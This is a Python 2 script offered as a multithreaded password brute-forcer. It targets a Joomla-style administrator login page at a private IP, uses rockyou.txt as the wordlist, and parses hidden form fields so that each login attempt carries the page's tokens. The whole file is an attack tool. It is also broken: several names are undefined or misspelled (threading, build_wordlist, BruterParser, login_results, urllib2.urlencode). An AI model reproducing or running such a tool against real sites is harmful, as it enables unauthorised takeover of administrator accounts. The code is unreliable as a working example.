import urllib2
import urllib
import cookielib
import sys
import Queue

from HTMLParser import HTMLParser

# general setting
user_thread	= 10
username =	"admin"
wordlist_file	="/usr/wordlist/rockyou.txt"
resume = None

# target specific setting
target_url = "http://192.168.130.133/administrator/index.php"
target_post = "http://192.168.130.133/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
	def __init__(self, username, words):

		self.username = username
		self.password_q = words
		self.found = False

		print "[+] Finished setting up for: %s" % username

	def run_bruteforce(self):

		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):

		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
			response = opener.open(target_url)
			page = response.read()
			print "[+] Trying: %s %s (%d left)" %(self.username,brute,self.password_q.qsize())

			# parse out the hidden fields
			parser = BruterParser()
			parser.feed(page)

			post_tags = parser.tags_results

			# add our username and password fields
			post_tags [username_field] = self.username
			post_tags[password_field]  = brute

			login_data=urllib2.urlencode(post_tags)
			login_response=opener.open(target_post,login_data)

			login_response = login_response.read()

			if success_check in login_results:
				self.found = True
				print "[+] Bruteforce successful"
				print "[+] Username: %s" % username
				print "[+] Password: %s" % brute
				print "[+] Waiting for other threads to exit..."



class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tags_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == "name":
					tag_name =value
				if name =="value":
					tag_value = value

			if tag_name is not None:
				self.tags_results[tag_name] = value

words = build_wordlist(wordlist_file)
brute_obj = Bruter(username,words)
brute_obj.run_bruteforce()